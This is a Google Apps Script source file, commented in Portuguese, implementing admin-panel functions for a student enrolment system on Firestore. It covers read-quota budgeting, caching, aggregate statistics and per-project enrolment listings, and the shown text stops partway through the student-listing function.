/**
 * 10_Painel.gs — as funções de gestão que o `Admin.html` chama por
 * `google.script.run`.
 *
 * O painel é o lado caro do sistema. O caminho público custa poucas leituras por
 * aluno e é protegido por cache (08_Api.gs); aqui cada tela abre uma pergunta
 * sobre o cadastro INTEIRO — "quantos são", "quais divergem", "me dá tudo em
 * CSV" — e é assim que se queima uma cota diária num clique.
 *
 * O sistema sobre Sheets (o sistema anterior, 08_Api.gs) fazia
 * `lerTudo(ALUNOS)` em CINCO destas funções: listar, exportar, detalhar, contar e
 * montar a lista de cursos. Lá isso era uma chamada à planilha; aqui seria uma
 * leitura COBRADA por aluno, a cada abertura de tela, contra 50 mil por dia. As
 * regras de negócio vieram de lá inteiras — o que mudou é COMO cada pergunta
 * chega ao banco.
 *
 * ------------------------------------------------------- Orçamento de leitura
 *
 * A função mais cara é `exportarCsv`: ela lê o cadastro inteiro, por definição —
 * exportar 3.000 alunos custa 3.000 leituras e não existe desenho que evite isso.
 * Tem teto de PAINEL_TETO_EXPORTACAO documentos, para uma exportação disparada
 * por engano não conseguir levar o dia junto.
 *
 * As outras, por chamada:
 *
 *   painelEstatisticas ....... 10 agregações + 1 leitura de ponto (os cursos),
 *                              ou ZERO com o cache quente (ver PAINEL_CACHE_S)
 *   painelProjetos ........... 1 leitura da configuração + 1 consulta (~6
 *                              projetos) + 1 agregação por projeto
 *   inscritosDoProjeto ....... 1 leitura de ponto + 1 consulta de até
 *                              PAINEL_MAX_INSCRITOS_PROJETO documentos (61 num
 *                              projeto lotado de 60 vagas)
 *   listarAlunos (consulta) .. 1 agregação + `tamanho` leituras por página, mais
 *                              1 leitura de ponto (os cursos) SÓ quando a tela
 *                              ainda não tem a lista — e a página N custa
 *                              N × `tamanho`, porque a caminhada relê as
 *                              anteriores (ver PAINEL_MAX_PAGINA)
 *   listarAlunos (exata) ..... 1 consulta por igualdade (+ os cursos, se pedidos)
 *   listarAlunos (varredura) . até PAINEL_TETO_VARREDURA leituras
 *   atualizarAlunos .......... 2 agregações + o custo de `listarAlunos` quando o
 *                              cruzamento é pulado; quando ele roda, mais a
 *                              reconciliação inteira (|i|+|m|+|a|+1) e 3
 *                              agregações para fechar a conta do dia — ver
 *                              PAINEL_ORCAMENTO_RECONCILIACAO, que é o freio
 *   detalheAluno ............. 3 leituras de ponto (+1 consulta e 1 agregação por
 *                              projeto quando a janela de edição pede a lista)
 *   editarAluno .............. até 5 leituras de ponto + 1 agregação; e quando a
 *                              MATRÍCULA muda, mais 2 consultas de vizinhança
 *                              (poucos documentos cada) e uma reconciliação
 *                              inteira por cima
 *   listarLotes .............. até 50
 *   listarLog ................ até 100
 *   lerConfiguracoes ......... 1
 *   salvarConfiguracao ....... 0 leituras (1 escrita, mais o log)
 *   resolverAluno ............ 1 leitura + 1 escrita (mais o log)
 *
 * Abrir o painel — as três abas de leitura — são 17 requisições na primeira vez,
 * e há teste que conta cada uma.
 *
 * Agregação (`contar`) é cobrada por bloco de mil entradas de índice casadas, e
 * não por documento: com 2.500 alunos, cada `contar` sem filtro custa 3 leituras.
 * Isso é documentação do Firestore, não medição nossa — o número real só o banco
 * de verdade diz.
 *
 * ------------------------------------------------------------- E o RELÓGIO
 *
 * Leitura barata não é a mesma coisa que tela rápida, e o painel provou isso: as
 * 11 requisições de `painelEstatisticas` são baratas em COTA (11 leituras num
 * teto de 50 mil) e caras em ESPERA, porque saem uma atrás da outra e cada ida e
 * volta ao Firestore leva algo perto de 300 ms. São ~3,3 s de rede somados ao
 * custo fixo de uma execução do Apps Script (~1,5 s), e é isso que a coordenação
 * vê como "fica um tempinho carregando".
 *
 * O que dá para fazer daqui, e está feito:
 *
 *   - não repetir a mesma tela. O `Admin.html` guarda o que cada aba já carregou
 *     e voltar para uma aba aberta passou a custar zero;
 *   - não repetir a mesma pergunta em segundos. `painelEstatisticas` responde do
 *     CacheService por PAINEL_CACHE_S segundos, e qualquer atualização pedida
 *     pelo professor fura o cache;
 *   - não mandar o que a tela joga fora. `listarAlunos` só lê o documento de
 *     cursos quando o cliente diz que ainda não o tem.
 *
 * O que NÃO dá para fazer daqui: juntar as 10 agregações numa requisição só. O
 * `:runAggregationQuery` aceita várias agregações por chamada, mas todas sobre a
 * MESMA consulta — e aqui cada número tem um filtro diferente. Os dois caminhos
 * conhecidos para encurtar isso são de fora deste arquivo: `UrlFetchApp.fetchAll`
 * (pediria uma segunda porta de saída no Repo, hoje o único caminho de dados) ou
 * um documento de agregados por status, que só quem já percorre todos os alunos
 * — a reconciliação — pode manter sem mentir. Ver o relatório desta rodada.
 *
 * ------------------------------------------------- O que este arquivo NÃO tem
 *
 * `rodarReconciliacao`, `sincronizarForms`, `analisarArquivo`,
 * `confirmarImportacao`, `expurgarLote`, `listarBanners` e `enviarBanner` são das
 * outras fases desta mesma rodada. O `Admin.html` chama 28 e este arquivo
 * responde por 12.
 *
 * ------------------------------------------- O que este arquivo ESCREVE, e onde
 *
 * Até esta rodada o painel só escrevia `alunos` (a decisão de status) e a
 * configuração. `editarAluno` escreve nas FONTES — a inscrição e a lista oficial —,
 * e isso precisa estar dito em voz alta, porque `alunos` é DERIVADO: a
 * reconciliação o recalcula do zero a cada rodada (06_Reconciliacao.gs). Corrigir
 * um nome só na linha do cadastro é escrever na areia — some na madrugada
 * seguinte, sem aviso. Por isso cada campo da janela de edição é gravado na fonte
 * de onde ele vem, e a janela diz qual é:
 *
 *   matrícula ....... a INSCRIÇÃO (e o id do documento muda junto — ver `editarAluno`)
 *   nome digitado ... a INSCRIÇÃO
 *   nome oficial .... o MATRICULADO (a lista da secretaria)
 *   turma ........... o MATRICULADO
 *   projeto ......... a INSCRIÇÃO (e o id muda junto, pelo mesmo motivo)
 *
 * A única coisa que este arquivo grava em `alunos` fora de `resolverAluno` é a
 * PROJEÇÃO desses campos, com a mesma precedência que `montarAluno_` usa. Se as
 * duas divergirem, a tela mostra um valor até a próxima reconciliação e outro
 * depois — existe teste que compara as duas.
 *
 * -------------------------------------------------- Suposições sobre `alunos`
 *
 * A coleção `alunos` é escrita pela reconciliação, que é de outro arquivo. Este
 * aqui só lê, e depende de três coisas do contrato combinado:
 *
 *   1. o ID DO DOCUMENTO é determinístico e derivado da matrícula, e é ele que o
 *      painel manda de volta em `resolverAluno` e `detalheAluno`. Não existe
 *      campo `id` — ele vem do nome do documento (`_id`), como em `projetos`;
 *   2. `matricula_id` guarda a matrícula normalizada (o id do documento em
 *      `matriculados`) e `inscricao_id` guarda a chave de dedup (o id do
 *      documento em `inscricoes`). É o que transforma o detalhe do aluno em três
 *      leituras de ponto em vez de três varreduras. Quando `matricula_id` vem
 *      vazio, `detalheAluno` deriva o endereço da própria matrícula — é a mesma
 *      regra, escrita duas vezes de propósito;
 *   3. os campos `cpf` e `email` EXISTEM em todo documento, ainda que vazios.
 *      `painelEstatisticas` conta quem tem CPF como "total menos os que têm o
 *      campo vazio", e no Firestore um campo AUSENTE não casa com nenhum filtro
 *      de igualdade: se a reconciliação omitir a chave em vez de gravá-la vazia,
 *      o painel passa a anunciar 100% de CPF em silêncio. NÃO ESTÁ PROVADO —
 *      depende do que a outra fase gravar.
 */

/**
 * Coleção dos alunos reconciliados.
 *
 * O nome canônico é da reconciliação; está repetido aqui pelo mesmo motivo que
 * `INSCRICOES_COLECAO` está repetido em 09_Projetos.gs (ver o comentário lá):
 * para o painel não depender da ordem de carregamento dos arquivos. Repetido é
 * aceitável; DIVERGENTE não — o Apps Script não reclama, a última declaração
 * vence em silêncio, e o painel passaria a contar uma coleção vazia.
 */
var ALUNOS_COLECAO = 'alunos';

/** Histórico de importações. Escrita pela importação; aqui só se lê. */
var LOTES_COLECAO = 'lotes';

/**
 * Documento OPCIONAL com o histograma de alunos por curso: um campo por curso,
 * valor = quantidade.
 *
 * Existe porque o Firestore não tem GROUP BY. O sistema sobre Sheets montava
 * "alunos por curso" e a lista do filtro de curso varrendo a tabela inteira em
 * JavaScript (`estatisticas()` e `cursosDistintos_()`), o que aqui seriam 2.500
 * leituras por abertura de tela — as duas telas mais visitadas do painel.
 *
 * A alternativa que não varre é esta: quem JÁ percorre todos os alunos (a
 * reconciliação, uma vez por importação) grava o resumo num documento, e o painel
 * o lê por 1 leitura. Enquanto o documento não existir, o cartão "Alunos por
 * curso" some (o `Admin.html` já o esconde quando a lista vem vazia) e o filtro
 * de curso fica só com "Todos" — degrada, não quebra, e não mente.
 *
 * Este arquivo NUNCA escreve aqui: derivar um agregado dentro de uma função de
 * leitura é o tipo de efeito colateral que ninguém encontra depois.
 */
var AGREGADOS_COLECAO = 'agregados';
var AGREGADOS_CURSOS = 'cursos';

/** Tamanho de página pedido pelo `Admin.html`, e o teto que se aceita dele. */
var PAINEL_TAMANHO_PADRAO = 50;
var PAINEL_TAMANHO_MAX = 200;

/**
 * Até que página a lista de alunos anda.
 *
 * O `Admin.html` pagina por NÚMERO de página ("Página 3 de 50", botões Anterior e
 * Próxima), e o Firestore pagina por CURSOR: para servir a página N é preciso ter
 * andado até ela. Como o web app não guarda estado entre chamadas, a página N
 * custa N × `tamanho` leituras — as N-1 primeiras são lidas e jogadas fora.
 *
 * Dez páginas de 50 são 500 leituras no pior caso, e é onde a linha foi traçada.
 * Além disso o painel responde com uma recusa que ensina o caminho certo:
 * filtrar. Ninguém encontra um aluno específico folheando a página 40 — encontra
 * pela busca, que aqui é uma leitura de ponto quando se digita matrícula.
 *
 * O passo seguinte conhecido, se um dia incomodar: guardar os cursores já
 * visitados no CacheService, chaveados pelos filtros. Aí a página N passa a
 * custar `tamanho`, e não N × `tamanho`. Não está feito porque são 2 ou 3
 * professores e o custo atual cabe folgado.
 */
var PAINEL_MAX_PAGINA = 10;

/**
 * Teto de documentos lidos numa busca por nome e numa exportação.
 *
 * A busca por SUBSTRING o Firestore não faz — não existe índice de "contém".
 * Então o caminho herdado do sistema sobre Sheets sobrevive aqui: lê e filtra em
 * JavaScript. Ele só é usado quando a busca não casa com nenhum campo exato
 * (matrícula, CPF, e-mail), ou seja, quando se digita um NOME.
 *
 * O custo é o que parece: até 1.500 leituras por busca por nome, ~3% da cota
 * diária. É aceitável porque a busca é disparada por botão, por 2 ou 3 pessoas.
 * Não seria aceitável no caminho do aluno, e por isso não está lá.
 */
var PAINEL_TETO_VARREDURA = 1500;
var PAINEL_TETO_EXPORTACAO = 5000;

/** Tamanho do bloco das varreduras. Menos idas ao banco para o mesmo custo. */
var PAINEL_BLOCO = 300;

var PAINEL_LIMITE_LOTES = 50;
var PAINEL_LIMITE_LOG = 100;

/**
 * Teto da lista "quem está inscrito NESTE projeto".
 *
 * 300 contra as 60 vagas de um projeto do semestre: cabe o projeto lotado MAIS a
 * fila de espera inteira (13_Auditorio.gs), com folga. A régua é a mesma de
 * DISCIPLINAS_MAX_INSCRITOS (12_Disciplinas.gs) e a de PAINEL_TETO_VARREDURA —
 * leitura cara é aceitável num botão que 2 ou 3 professores apertam, e não é
 * aceitável no caminho do aluno. Acima do teto a tela DIZ que cortou.
 */
var PAINEL_MAX_INSCRITOS_PROJETO = 300;

/** Teto do texto que o professor escreve no detalhe do aluno. */
var PAINEL_MAX_OBSERVACOES = 2000;

/** Tetos dos campos que a janela de edição grava nas fontes. */
var PAINEL_MAX_NOME = 120;
var PAINEL_MAX_TURMA = 40;

/**
 * Quantas linhas o cartão "Alunos por curso" mostra.
 *
 * O documento de agregados guarda até RECONCILIACAO_MAX_CURSOS = 100 cursos
 * (06_Reconciliacao.gs), e o cartão desenhava TODOS, em ordem alfabética. Com os
 * treze de hoje isso é uma tabelinha; com trinta virou rolagem, e a ordem
 * alfabética enterra justamente a linha que faz alguém olhar o cartão — foi
 * assim que "WORK EXPERIENCE - ADM21: 64" ficou no meio da lista em vez de no
 * topo. Doze cabem na tela sem rolar.
 *
 * O que fica de fora NÃO some: vai numa última linha com quantos cursos são e
 * quantos alunos eles somam, para o cartão continuar fechando com o total.
 */
var PAINEL_TETO_CURSOS = 12;

/**
 * O orçamento de leitura do botão Atualizar da aba Alunos, por dia.
 *
 * O botão roda a reconciliação antes de recarregar a lista, que é o que o
 * professor pediu — sem isso ele vê o retrato de antes da última inscrição. E a
 * reconciliação é a função mais cara do sistema: ela lê `inscricoes`,
 * `matriculados` e `alunos` inteiras, ou seja |i| + |m| + |a| + 1 leituras por
 * rodada (06_Reconciliacao.gs). Com os números reais do CESUTECH — 2.500
 * matriculados, ~500 inscrições, ~2.500 alunos — são ~5.500 leituras. A cota do
 * plano Spark é 50.000 por DIA, para o sistema inteiro.
 *
 * Ou seja: nove cliques neste botão consomem o dia, e o que quebra em seguida
 * são as INSCRIÇÕES, não o painel. Um botão de recarregar que pode desligar o
 * formulário é exatamente o tipo de arma que este sistema não aceita ter —
 * então ele tem dois freios, com trabalhos diferentes:
 *
 *   1. NADA MUDOU, NÃO RODA. Duas agregações (contar inscrições e contar
 *      matriculados) contra os números da última rodada. Iguais, a reconciliação
 *      é pulada e só a lista recarrega — dez cliques seguidos custam 10 × (2
 *      agregações + uma página de alunos), e não 55.000 leituras. É o mesmo
 *      desenho de `sincronizarForms`, que já se recusa a reconciliar quando não
 *      entrou resposta nova;
 *   2. QUINZE MIL LEITURAS POR DIA, e aí para. É o freio para o dia do evento,
 *      quando as inscrições entram sem parar e o freio 1 nunca fecha: cada
 *      clique tem gente nova para cruzar, e cada clique custa os 5.500. 15.000 é
 *      30% da cota diária — o suficiente para duas ou três rodadas no tamanho
 *      real do cadastro (e para dezenas no tamanho de hoje, que é o que a
 *      coordenação está usando), e deixa 35.000 para o caminho do aluno, que é
 *      quem não pode parar. O custo de cada rodada é MEDIDO (o tamanho das três
 *      coleções na rodada anterior), não estimado por chute.
 *
 * Estourado o orçamento, o botão continua funcionando: ele recarrega a lista e
 * diz, com o número na frente, por que não cruzou. As saídas ficam ditas na
 * mensagem — a rodada automática das 5h (06_Reconciliacao.gs) e o botão
 * "Reconciliar agora" da aba Painel, que NÃO tem teto. Isso não faz do teto uma
 * encenação: o botão sem teto é um gesto deliberado, numa aba que a pessoa
 * precisa abrir de propósito; o daqui é o que se clica por reflexo, e é o reflexo
 * que precisa de freio.
 *
 * O dia é o dia LOCAL (`agora()`), e a cota do Spark vira à meia-noite do
 * Pacífico — 4h ou 5h em Brasília. As duas viradas não coincidem, e não precisam:
 * isto é um guarda-corpo com número escrito, não contabilidade da cota.
 */
var PAINEL_ORCAMENTO_RECONCILIACAO = 15000;

/**
 * Onde fica a marca da última reconciliação pedida pelo painel.
 *
 * Propriedade de script, e não documento no Firestore, pelo mesmo motivo de
 * SYNC_FORMS_MARCA (06_Reconciliacao.gs): é um carimbo reescrito a cada rodada, e
 * pagar uma escrita de banco por ele desfaria parte da economia que ele existe
 * para fazer. Guarda JSON: os dois contadores que servem de linha de base, o
 * instante, o dia e quanto já foi gasto nele.
 */
var PAINEL_MARCA_RECONCILIACAO = 'painel_reconciliacao';

/**
 * Por quantos segundos os números da aba Painel ficam guardados no CacheService.
 *
 * TRINTA, o mesmo de CACHE_ROTAS_S (08_Api.gs), e pelo mesmo motivo de lá: é a
 * janela em que "o professor abriu duas vezes seguidas" ainda é o mesmo gesto, e
 * curta o bastante para nenhum número envelhecer na cara de quem olha.
 *
 * A diferença em relação ao cache do site é POR QUE ele existe. Lá o problema é
 * cota: uma enxurrada anônima de `?api=projetos` torraria as 50 mil leituras do
 * dia. Aqui o problema é o relógio: 2 ou 3 professores nunca vão ameaçar a cota,
 * mas cada abertura do painel custa 11 idas e voltas ao Firestore em fila.
 *
 * E o cuidado que o cache do site NÃO precisa ter, este precisa: o painel mostra
 * número que a coordenação acabou de mudar. Cache que responde velho para quem
 * ACABOU de escrever é pior do que espera — a professora clica em Salvar, volta,
 * vê o valor de antes e conclui que o sistema perdeu a decisão dela. Por isso:
 *
 *   - `resolverAluno` invalida a chave assim que grava (é a única escrita deste
 *     arquivo que muda algum dos dez números);
 *   - as escritas das OUTRAS fases — reconciliação, sincronização com o Forms,
 *     importação, expurgo — não podem invalidar daqui, porque não são deste
 *     arquivo. Quem fecha esse buraco é o `Admin.html`: toda recarga que segue
 *     uma gravação, e o botão Atualizar, mandam `atualizar: true`, que fura o
 *     cache e ainda REESCREVE a entrada — então o professor seguinte também
 *     recebe o número novo.
 *
 * O que sobra de atraso, e é aceito: a rodada automática das 3h e a escrita de
 * OUTRO professor podem levar até 30 s para aparecer numa tela que ninguém
 * mandou atualizar. Com 2 ou 3 pessoas no painel, isso é teoria.
 */
var PAINEL_CACHE_S = 30;

/** Chave do cache. Nome fixo: o cache é do script, não da execução. */
var PAINEL_CACHE_ESTATISTICAS = 'painel_estatisticas';

/**
 * Responde do cache, ou monta, guarda e responde.
 *
 * Parente próximo de `rotaCacheada_` (08_Api.gs), e separado dele de propósito:
 * lá a resposta é um `ContentService` e o JSON pode ser devolvido sem desembrulhar;
 * aqui quem chama é o `google.script.run`, que precisa de OBJETO. Herdar a função
 * de lá também amarraria este arquivo a 08_Api.gs, que os testes do painel nem
 * carregam.
 *
 * Todo contato com o cache está dentro de try/catch, e isso é regra: cache é
 * otimização, nunca dependência. Serviço fora do ar, entrada acima dos 100 KB ou
 * qualquer outra falha devolve a função ao comportamento sem cache — mais caro e
 * igualmente correto. Fora do Apps Script (os testes em Node) `CacheService`
 * pode simplesmente não existir, e é o mesmo caminho.
 */
function painelCacheado_(chave, forcar, montar) {
  var cache = cacheDoPainel_();

  if (cache && !forcar) {
    var guardado = null;
    try {
      guardado = cache.get(chave);
    } catch (e) {
      console.error('cache get ' + chave + ': ' + e.message);
    }
    if (guardado) {
      try {
        return JSON.parse(guardado);
      } catch (e) {
        // Entrada ilegível é entrada que não existe. O cache é memória de fora;
        // estourar aqui transformaria uma otimização em falha do painel.
        console.error('cache ilegível em ' + chave + ': ' + e.message);
      }
    }
  }

  var resposta = montar();

  // Só resposta BOA entra. Guardar um `{ ok: false }` faria uma indisponibilidade
  // de um segundo virar erro repetido por PAINEL_CACHE_S segundos — e o professor
  // clicaria em Atualizar vendo a mesma falha, sem que nada estivesse errado.
  if (cache && resposta && resposta.ok) {
    try {
      cache.put(chave, JSON.stringify(resposta), PAINEL_CACHE_S);
    } catch (e) {
      console.error('cache put ' + chave + ': ' + e.message);
    }
  }

  return resposta;
}

/** Descarta os números guardados. Chamada por quem os torna falsos. */
function invalidarCachePainel_() {
  var cache = cacheDoPainel_();
  if (!cache) return;
  try {
    cache.remove(PAINEL_CACHE_ESTATISTICAS);
  } catch (e) {
    console.error('cache remove ' + PAINEL_CACHE_ESTATISTICAS + ': ' + e.message);
  }
}

/**
 * O cache do SCRIPT, e não o do usuário: o ganho está em uma execução aproveitar
 * o que outra montou. Cache por usuário guardaria uma cópia por professor e não
 * pouparia requisição nenhuma.
 */
function cacheDoPainel_() {
  try {
    return CacheService.getScriptCache();
  } catch (e) {
    return null;
  }
}

// ------------------------------------------------------------ Aba Painel

/**
 * Os números do topo do painel. Zero varredura: tudo por agregação.
 *
 * `estatisticas()` no sistema sobre Sheets lia quatro tabelas inteiras e contava
 * em JavaScript. Aqui cada número é uma pergunta que o servidor responde com um
 * inteiro — o tráfego não cresce com o tamanho do cadastro.
 *
 * O que NÃO dá para fazer por agregação: "com CPF preenchido" (o Firestore só
 * tem filtro de IGUALDADE em `listar`/`contar`, e "diferente de vazio" não é
 * igualdade). A saída é contar os VAZIOS e subtrair — exato, desde que o campo
 * exista em todo documento (ver a suposição 3 no cabeçalho).
 *
 * Diferença honesta em relação ao sistema atual: lá "com CPF" queria dizer CPF
 * com 11 dígitos, validado. Aqui quer dizer campo preenchido. Validar exigiria
 * ler os 2.500 documentos, que é exatamente o que este arquivo existe para não
 * fazer.
 *
 * As dez agregações são baratas em cota e CARAS EM ESPERA — elas saem em fila, e
 * são elas as ~3,3 s de rede da tela de abertura. Daí o cache: `payload.atualizar`
 * fura e reescreve, tudo o mais responde do CacheService. A conferência do token
 * vem ANTES de qualquer contato com o cache, e não é detalhe: os dez números
 * descrevem o cadastro inteiro, e responder do cache sem token seria entregá-los
 * mais barato do que o banco entregaria.
 */
function painelEstatisticas(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    return painelCacheado_(PAINEL_CACHE_ESTATISTICAS, payload.atualizar, function () {
      var total = contar(ALUNOS_COLECAO);

      var porStatus = {};
      [STATUS.CONFIRMADO, STATUS.SO_INSCRITO, STATUS.SO_MATRICULADO, STATUS.DIVERGENCIA]
        .forEach(function (s) {
          porStatus[s] = contar(ALUNOS_COLECAO, { campo: 'status', valor: s });
        });

      // MATRÍCULA, e não CPF: a cascata de `casar_` (06_Reconciliacao.gs) começa
      // na matrícula — "a chave institucional do CESUTECH, a mais forte de
      // todas" —, e nenhum formulário deste sistema pede CPF. O cartão media o
      // campo errado e afirmava 0% desde sempre, sobre uma qualidade que na
      // verdade estava alta.
      //
      // `total menos os que têm o campo vazio` só funciona porque `montarAluno_`
      // grava a chave SEMPRE, ainda que em branco: no Firestore campo AUSENTE
      // não casa com filtro de igualdade, e o documento sem a chave seria
      // contado como quem tem matrícula. Vale para `matricula` como já valia
      // para `email` — está no cabeçalho de 06_Reconciliacao.gs.
      //
      // Isto mede quem PREENCHEU a matrícula, e não quem tem matrícula que
      // existe: quem confere contra a lista oficial é `matricula_conferida`, que
      // vira o "?" na lista de inscritos. São perguntas diferentes, e esta é a
      // que diz se a reconciliação tem por onde começar.
      var comMatricula = total - contar(ALUNOS_COLECAO, { campo: 'matricula', valor: '' });
      var comEmail = total - contar(ALUNOS_COLECAO, { campo: 'email', valor: '' });

      var cursos = painelCursos_();

      return {
        ok: true,
        dados: {
          total: total,
          porStatus: porStatus,
          porCurso: cursos.histograma,
          // O que não coube no teto do cartão. Vai como número, e não sumindo:
          // um cartão que mostra 12 de 37 cursos sem dizer isso passa a mentir
          // sobre o total exatamente quando o cadastro fica grande.
          porCursoResto: cursos.resto,
          inscricoes: contar(INSCRICOES_COLECAO),
          matriculados: contar(MATRICULADOS_COLECAO),
          lotes: contar(LOTES_COLECAO),
          qualidade: {
            comEmail: comEmail,
            comMatricula: comMatricula,
            percEmail: total ? Math.round(comEmail / total * 100) : 0,
            percMatricula: total ? Math.round(comMatricula / total * 100) : 0
          }
        }
      };
    });
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Cursos conhecidos, do documento de agregados. Uma leitura, ou nenhuma resposta.
 *
 * Devolve as duas formas que o painel pede, e elas têm ORDENS DIFERENTES de
 * propósito, porque são duas perguntas diferentes:
 *
 *   lista        os nomes, em ordem alfabética e COMPLETA. É o `select` do filtro
 *                de curso: quem procura um curso ali procura pelo nome, e um
 *                curso que ficasse de fora viraria um filtro impossível de pedir.
 *   histograma   os MAIORES primeiro, cortados em PAINEL_TETO_CURSOS. É o cartão
 *                "Alunos por curso", e ele existe para mostrar onde estão os
 *                alunos — a ordem alfabética enterrava a linha grande no meio.
 *   resto        quantos cursos ficaram de fora do corte e quantos alunos eles
 *                somam, para o cartão continuar fechando com o total.
 *
 * Documento ausente devolve tudo vazio — ver AGREGADOS_CURSOS.
 */
function painelCursos_() {
  var documento = ler(AGREGADOS_COLECAO, AGREGADOS_CURSOS);
  if (!documento) return { lista: [], histograma: [], resto: { cursos: 0, alunos: 0 } };

  var todos = [];
  Object.keys(documento).forEach(function (chave) {
    // `_id`/`_nome` são metadados do Repo; `atualizado_em` é carimbo de quem
    // gravou. Nenhum dos três é curso.
    if (chave.charAt(0) === '_' || chave === 'atualizado_em') return;
    todos.push({ curso: chave, total: Number(documento[chave]) || 0 });
  });

  var lista = todos.map(function (c) { return c.curso; })
    .sort(function (a, b) { return a.localeCompare(b); });

  // Empate desempatado pelo nome, e não pela ordem em que os campos vieram do
  // documento: sem isso, dois cursos de mesmo tamanho trocariam de lugar entre
  // duas aberturas da tela sem nada ter mudado.
  todos.sort(function (a, b) {
    if (b.total !== a.total) return b.total - a.total;
    return a.curso.localeCompare(b.curso);
  });

  var resto = { cursos: 0, alunos: 0 };
  todos.slice(PAINEL_TETO_CURSOS).forEach(function (c) {
    resto.cursos++;
    resto.alunos += c.total;
  });

  return { lista: lista, histograma: todos.slice(0, PAINEL_TETO_CURSOS), resto: resto };
}

/** Projetos com vagas e ocupação, para a aba Projetos. */
function painelProjetos(payload) {
  try {
    exigirAdmin(payload && payload.token);

    // `listarProjetos` (09_Projetos.gs) lê a coleção de projetos sem limite e faz
    // uma agregação por projeto. É a única leitura sem teto que este arquivo
    // provoca, e ela é do outro arquivo: a coleção tem meia dúzia de documentos
    // por semestre, um por projeto de extensão, e o caminho público já paga a
    // mesma consulta (com cache de 30s em 08_Api.gs). Fica registrado, não
    // consertado daqui.
    return {
      ok: true,
      itens: listarProjetos(false),
      vagasPadrao: Number(config('vagas_padrao', '60'))
    };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Quem está inscrito neste projeto.
 *
 * A aba Projetos mostrava a OCUPAÇÃO — "47 / 60", com a barrinha — e não tinha
 * como abrir o número: quem são os 47. A resposta existia só na aba Alunos, e lá
 * a pergunta é outra (o cadastro inteiro, filtrado por status), então a
 * coordenação tinha de exportar CSV para responder "quem está no R+ Cidades".
 *
 * ------------------------------------------------------------------- O custo
 *
 * 1 leitura de ponto (o projeto) + uma consulta que devolve até
 * PAINEL_MAX_INSCRITOS_PROJETO documentos:
 *
 *   1 + min(inscritos no projeto, 300)
 *
 * Com um projeto lotado do CESUTECH são 61 leituras por clique — 0,12% das 50
 * mil do dia. Seis projetos abertos um atrás do outro custam ~370, e a conta não
 * cresce com o tamanho do cadastro: ela cresce com o tamanho do PROJETO, que é o
 * número que a coordenação já vê na tela antes de clicar.
 *
 * Filtro de igualdade em UM campo (`projeto_id`), sem ordenação declarada:
 * `listar` ordena por `__name__` ASCENDENTE, que é o desempate embutido no índice
 * automático de campo único. Ordenar por `nome` no banco pediria índice composto
 * e devolveria `400 The query requires an index` — a cicatriz de
 * `ultimosRegistros` (04_Log.gs). A ordem alfabética é feita aqui, em JavaScript,
 * sobre as poucas dezenas que voltaram.
 *
 * ------------------------------------------------------------ A fila de espera
 *
 * Quem está em espera APARECE nesta lista, marcado. É deliberado, e obriga a
 * resposta a mandar dois números em vez de um: `ocupam` é o que casa com a
 * ocupação da tabela (`contarInscritos_`, 09_Projetos.gs, não conta a fila) e
 * `lidas` é o tamanho da lista na tela. Sem os dois separados, a coordenação
 * contaria as linhas, veria 63 numa tabela que diz "60 / 60" e concluiria que o
 * limite de vagas furou — que é exatamente a dúvida que este sistema não pode
 * deixar no ar.
 */
function inscritosDoProjeto(payload) {
  try {
    exigirAdmin(payload && payload.token);

    var id = String((payload && payload.id) || '');
    var projeto = projetoPorId(id);
    if (!projeto) return { ok: false, erro: 'Projeto não encontrado. Recarregue a lista.' };

    var itens = listar(INSCRICOES_COLECAO, {
      campo: 'projeto_id',
      valor: id,
      limite: PAINEL_MAX_INSCRITOS_PROJETO
    }).itens.map(function (i) {
      return {
        matricula: i.matricula || '',
        nome: i.nome || '',
        email: i.email || '',
        whatsapp: i.whatsapp || '',
        // O que a pessoa escolheu em "Curso e fase". Vai junto porque é o campo
        // que o cruzamento da aba Disciplinas desconfia — ver
        // `matriculadosDaDisciplina` (12_Disciplinas.gs). Aqui ele é informação,
        // não chave.
        curso_fase: i.curso_fase || '',
        em_espera: String(i.em_espera).toUpperCase() === 'SIM',
        matricula_conferida: String(i.matricula_conferida).toUpperCase() === 'SIM',
        criado_em: i.criado_em || ''
      };
    });

    itens.sort(function (a, b) { return chaveNome(a.nome).localeCompare(chaveNome(b.nome)); });

    var emEspera = itens.filter(function (i) { return i.em_espera; }).length;

    var resposta = {
      ok: true,
      projeto: projeto.nome || '',
      vagas: Number(projeto.vagas || 0),
      lidas: itens.length,
      ocupam: itens.length - emEspera,
      emEspera: emEspera,
      itens: itens
    };

    // Lista cortada pelo teto tem de DIZER que foi cortada — o mesmo cuidado de
    // `listarDisciplinas`. O inscrito 301 sumindo em silêncio faria a
    // coordenação concluir que ele não se inscreveu.
    if (itens.length === PAINEL_MAX_INSCRITOS_PROJETO) {
      resposta.aviso = 'Mostrando as primeiras ' + PAINEL_MAX_INSCRITOS_PROJETO +
        ' inscrições deste projeto. Há mais — use Exportar CSV na aba Alunos para a lista completa.';
    }
    return resposta;
  } catch (err) {
    console.error('inscritosDoProjeto: ' + err.message);
    return { ok: false, erro: err.message };
  }
}

// ------------------------------------------------------------ Aba Alunos

/**
 * Lista alunos com filtro, busca e paginação.
 *
 * É a função mais visitada do painel, e a que mais mudou de forma. No sistema
 * sobre Sheets era `lerTudo(ALUNOS).filter(...)` seguido de `slice` — traz tudo,
 * filtra em memória, mostra 50. Aqui há TRÊS caminhos, e a escolha entre eles é o
 * assunto da função:
 *
 *   consulta   sem busca e com no máximo um filtro. `fieldFilter` no banco +
 *              paginação por cursor. Custo: `tamanho` leituras por página.
 *   exata      a busca "parece" matrícula, CPF ou e-mail. Vira igualdade no
 *              banco: uma leitura, não 2.500. É o caso comum — quem procura um
 *              aluno cola o número dele.
 *   varredura  busca por NOME, ou os dois filtros juntos. Lê e filtra em
 *              JavaScript, com teto. É o caminho herdado, e o único caro.
 *
 * Por que a busca exata cai para a varredura quando não acha nada: matrícula
 * digitada pela metade não casa por igualdade, e o professor não tem como saber
 * disso. Custa uma consulta a mais no caminho que já ia varrer de qualquer jeito,
 * e garante que nenhuma busca perca resultado que o sistema atual encontrava.
 */
function listarAlunos(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var pedido = pedidoDeAlunos_(payload);
    var pagina = Math.max(1, Math.floor(Number(payload.pagina || 1)) || 1);
    var tamanho = Math.min(PAINEL_TAMANHO_MAX,
